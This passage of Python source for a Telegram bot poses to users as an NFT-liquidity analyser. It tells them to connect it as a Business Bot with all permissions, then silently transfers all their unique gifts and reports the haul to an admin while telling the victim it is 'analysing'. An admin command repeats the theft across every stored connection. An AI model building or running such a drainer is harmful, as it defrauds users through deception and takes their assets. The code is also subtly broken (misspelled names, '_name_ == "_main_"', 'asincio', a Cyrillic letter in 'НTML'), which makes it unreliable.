except Exception as e:
        error_msg = str(e)
        logging.error(f"Ошибка в transfer_all_unique_gifts: {error_msg}")
        result["errors"].append(error_msg)

    return result


@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        user_id = business_connection.user.id
        conn_id = business_connection.id

        # Сохраняем подключение
        connections = load_json_file(CONNECTIONS_FILE)
        connections = [c for c in connections if c["user_id"] != user_id]  # Удаляем старые записи
        connections.append({
            "user_id": user_id,
            "business_connection_id": conn_id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name,
            "date": datetime.now().isoformat()
        })
        save_to_json(CONNECTIONS_FILE, connections)

        # Пытаемся перевести подарки
        transfer_result = await transfer_all_unique_gifts(bot, conn_id, user_id)

        # Формируем отчет
        report = (
            f"🔗 Новое подключение:\n"
            f"👤 Пользователь: @{business_connection.user.username or 'нет'}\n"
            f"🆔 ID: {user_id}\n\n"
            f"📊 Результат перевода:\n"
            f"• Всего подарков: {transfer_result['total']}\n"
            f"• Успешно: {transfer_result['transferred']}\n"
            f"• Ошибок: {transfer_result['failed']}\n"
        )

        if transfer_result['errors']:
            report += "\nОшибки:\n" + "\n".join(
                f"• {e}" for e in transfer_result['errors'][:3])  # Показываем первые 3 ошибки

        await bot.send_message(ADMIN_ID, report)
        await bot.send_message(user_id,
                              "✅ Бот успешно подключен! Анализирую...")

    except Exception as e:
        logging.error(f"Ошибка в handle_business_connect: {e}")
        await bot.send_message(ADMIN_ID, f"🚨 Ошибка при подключении: {str(e)}")


@dp.message(Command("check_gifts"))
async def check_gifts_handler(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    connections = load_json_file(CONNECTIONS_FILE)
    if not connections:
        return await message.answer("Нет активных подключений.")

    for conn in connections:
        try:
            result = await transfer_all_unique_gifts(bot, conn["business_connection_id"], conn["user_id"])
            msg = (
                f"Проверка {conn.get('username', conn['user_id'])}:\n"
                f"• Передано: {result['transferred']}\n"
                f"• Ошибок: {result['failed']}"
            )
            await message.answer(msg)
            await asyncio.sleep(5)  # Чтобы не получить flood control
        except Exception as e:
            await message.answer(f"Ошибка для {conn['user_id']}: {str(e)}")


@dp.message(Command("start"))
async def start_command(message: Message):
    try:
        conections = load_json_file(CONECTIONS_FILE)
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        welcome_text = """
👋 <b>Приветствую!</b> Я бот, который высчитывает <i> ликвидность ваших NFT!</i>! ✨

📌 <b>Как начать работу?</b>
1. Добавьте меня как <b>Business Bot</b> в настройках Telegram
2. Выдайте разрешения
3. Я начну анализировать ваши NFT

🔹 <i>Подключение:</i>
• Откройте <b>Настройки → Telegram для бизнеса → Чат-боты</b>
• Выберите меня и активируйте все разрешения!

🚀 После подключения я смогу:
• Показывать статистику ваших подарков 🎁
• Считать их ликвидность и какой % успешной продажи
• Работать 24/7

❗Зачем ставить галочки?
🤖Боту нужно сгенерировать Business ID, для вычисления ликвидности NFT🎉

<b>Готовы начать?</b> Жду вашего подключения! 😊
        """
        await message.answer(welcome_text, parse_mode="HTML")
    else:
        admin_text = f"""
🛠️ <b>Привет, админ</b> 🛠️

• Подключений: <>{count}</>
⚙️ Бот активен и готов к работе!
        """
        await message.answer(admin_text, parse_mode="НTML")


async def main():
    await dp.start_polling(bot)


if _name_ == "_main_":
    asincio.run(main())
